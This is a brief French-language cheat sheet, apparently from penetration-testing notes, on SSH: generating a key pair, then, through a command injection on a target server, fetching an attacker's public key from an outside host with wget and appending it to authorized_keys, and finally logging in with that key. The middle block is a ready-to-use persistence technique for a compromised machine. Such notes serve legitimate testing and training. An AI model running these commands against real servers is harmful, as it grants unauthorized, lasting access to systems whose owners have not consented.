# ssh

* Créer une paire de clés SSH :

```
ssh-keygen -b 4096
```

* Importer une clé SSH sur un serveur avec une injection de commande (attention à l'encodage URL qui peut parfois être bloquant) :

```
wget http://<IP>:<PORT>/keys.pub -O /tmp/<FILE>
mkdir /home/<USER>/.ssh
cat /tmp/<FILE> >> ~/.ssh/authorized_keys
cat  ~/.ssh/authorized_keys
```

* Réaliser une connexion avec une clé SSH :

```
ssh -i keys <USER>@<IP>
```
